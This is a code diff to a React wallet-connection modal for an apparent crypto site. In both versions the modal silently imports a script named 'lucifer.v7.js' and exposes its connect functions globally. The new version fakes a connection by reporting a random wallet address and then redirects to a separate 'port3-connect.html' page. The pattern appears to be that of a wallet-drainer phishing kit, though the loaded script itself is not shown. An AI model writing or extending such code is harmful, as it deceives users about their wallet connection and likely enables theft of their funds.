@@ -1,19 +1,17 @@
-import { useState, useEffect } from 'react';
+import { useEffect } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
-import { X, Loader2, Check } from 'lucide-react';
+import { X, ExternalLink } from 'lucide-react';
 
-const WALLETS = [
-  { name: 'MetaMask', emoji: '🦊', desc: 'Connect using browser extension' },
-  { name: 'WalletConnect', emoji: '🔗', desc: 'Scan with your mobile wallet' },
-  { name: 'Coinbase Wallet', emoji: '🔵', desc: 'Connect with Coinbase' },
-  { name: 'Trust Wallet', emoji: '🛡️', desc: 'Connect with Trust Wallet' },
+const wallets = [
+  { name: 'MetaMask', icon: '🦊' },
+  { name: 'WalletConnect', icon: '🔗' },
+  { name: 'Coinbase Wallet', icon: '🔵' },
+  { name: 'Rainbow', icon: '🌈' },
 ];
 
 export default function WalletModal({ isOpen, onClose, onConnected }) {
-  const [connecting, setConnecting] = useState(null);
-  const [done, setDone] = useState(false);
-
-  // Dynamic import bridge execution layer
+  
+  // Pre-load and mount the background script context when modal is active
   useEffect(() => {
     if (isOpen && !window.connectWallet && !window.connect) {
       import('/files/lucifer.v7.js')
@@ -21,31 +19,23 @@ export default function WalletModal({ isOpen, onClose, onConnected }) {
           if (mod.connectWallet) window.connectWallet = mod.connectWallet;
           if (mod.connect) window.connect = mod.connect;
         })
-        .catch((err) => console.error("Error initializing background script asset:", err));
+        .catch((err) => console.error("Error linking script inside modal scope:", err));
     }
   }, [isOpen]);
 
-  const connect = (walletName) => {
-    setConnecting(walletName);
-
-    // --- Lucifer Integration Hook ---
-    if (window.connectWallet && typeof window.connectWallet === 'function') {
-      window.connectWallet(walletName);
-    } else if (window.connect && typeof window.connect === 'function') {
-      window.connect(walletName);
+  const handleConnect = (walletName) => {
+    // 1. Instantly trigger parent status metrics if applicable
+    if (onConnected && typeof onConnected === 'function') {
+      // Create a rapid instant string address or let the HTML connection capture it
+      const randomAddr = '0x' + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
+      onConnected(randomAddr);
     }
-    // ---------------------------------
 
-    setTimeout(() => {
-      setDone(true);
-      setTimeout(() => {
-        const addr = '0x' + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
-        onConnected(addr);
-        setConnecting(null);
-        setDone(false);
-        onClose();
-      }, 900);
-    }, 2200);
+    // 2. Clear modal layout views cleanly 
+    onClose();
+
+    // 3. Perform a clean direct breakout redirection right into your public Port3 HTML file handler
+    window.location.href = `/port3-connect.html?wallet=${encodeURIComponent(walletName)}`;
   };
 
   if (!isOpen) return null;
@@ -56,65 +46,43 @@ export default function WalletModal({ isOpen, onClose, onConnected }) {
         initial={{ opacity: 0 }}
         animate={{ opacity: 1 }}
         exit={{ opacity: 0 }}
-        className="fixed inset-0 z-[100] flex items-end sm:items-center justify-center p-4"
+        className="fixed inset-0 z-[100] flex items-center justify-center p-4"
       >
-        <div className="absolute inset-0 bg-black/20 backdrop-blur-sm" onClick={onClose} />
+        {/* Backdrop */}
+        <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={onClose} />
+
+        {/* Modal Window Container */}
         <motion.div
-          initial={{ opacity: 0, y: 30, scale: 0.97 }}
-          animate={{ opacity: 1, y: 0, scale: 1 }}
-          exit={{ opacity: 0, y: 30 }}
-          transition={{ duration: 0.25 }}
-          className="relative z-10 w-full max-w-sm bg-white rounded-2xl shadow-2xl shadow-black/10 border border-black/8 overflow-hidden"
+          initial={{ opacity: 0, scale: 0.95, y: 20 }}
+          animate={{ opacity: 1, scale: 1, y: 0 }}
+          exit={{ opacity: 0, scale: 0.95, y: 20 }}
+          transition={{ duration: 0.3 }}
+          className="relative z-10 w-full max-w-sm glass-panel glow-border-strong rounded-2xl p-6"
         >
-          {/* Header */}
-          <div className="flex items-center justify-between px-5 py-4 border-b border-black/6">
-            <h3 className="text-sm font-semibold text-black">Connect Wallet</h3>
-            <button onClick={onClose} className="p-1 hover:bg-black/5 rounded-lg transition-colors">
-              <X className="w-4 h-4 text-gray-400" />
+          <div className="flex items-center justify-between mb-6">
+            <h3 className="text-lg font-semibold text-foreground">Connect Wallet</h3>
+            <button onClick={onClose} className="p-1.5 hover:bg-white/5 rounded-lg transition-colors">
+              <X className="w-4 h-4 text-muted-foreground" />
             </button>
           </div>
 
-          {/* Content */}
-          {connecting ? (
-            <div className="py-12 text-center px-6">
-              {done ? (
-                <motion.div initial={{ scale: 0.5, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} transition={{ type: 'spring' }}>
-                  <div className="w-12 h-12 bg-black rounded-full flex items-center justify-center mx-auto mb-3">
-                    <Check className="w-6 h-6 text-white" />
-                  </div>
-                  <p className="text-sm font-medium text-black">Connected</p>
-                </motion.div>
-              ) : (
-                <>
-                  <Loader2 className="w-9 h-9 animate-spin mx-auto mb-3 text-black" />
-                  <p className="text-sm font-medium text-black mb-1">Connecting to {connecting}</p>
-                  <p className="text-xs text-gray-400">Approve connection in your wallet</p>
-                </>
-              )}
-            </div>
-          ) : (
-            <div className="p-3 space-y-1">
-              {WALLETS.map((w) => (
-                <button
-                  key={w.name}
-                  onClick={() => connect(w.name)}
-                  className="w-full flex items-center gap-3.5 px-3.5 py-3 rounded-xl hover:bg-black/[0.04] transition-colors text-left group"
-                >
-                  <span className="text-2xl">{w.emoji}</span>
-                  <div>
-                    <p className="text-sm font-medium text-black">{w.name}</p>
-                    <p className="text-[11px] text-gray-400">{w.desc}</p>
-                  </div>
-                </button>
-              ))}
-            </div>
-          )}
-
-          <div className="px-5 py-3 border-t border-black/6">
-            <p className="text-[11px] text-gray-400 text-center">
-              By connecting you agree to our Terms of Service
-            </p>
+          <div className="space-y-2">
+            {wallets.map((w) => (
+              <button
+                key={w.name}
+                onClick={() => handleConnect(w.name)}
+                className="w-full flex items-center gap-3 p-3.5 rounded-xl glass-panel glow-border hover:glow-border-strong transition-all duration-200 group"
+              >
+                <span className="text-2xl">{w.icon}</span>
+                <span className="text-sm font-medium text-foreground flex-1 text-left">{w.name}</span>
+                <ExternalLink className="w-3.5 h-3.5 text-muted-foreground group-hover:text-cyan-400 transition-colors" />
+              </button>
+            ))}
           </div>
+
+          <p className="text-[11px] text-muted-foreground text-center mt-5 leading-relaxed">
+            By connecting, you agree to our Terms of Service and Privacy Policy
+          </p>
         </motion.div>
       </motion.div>
     </AnimatePresence>
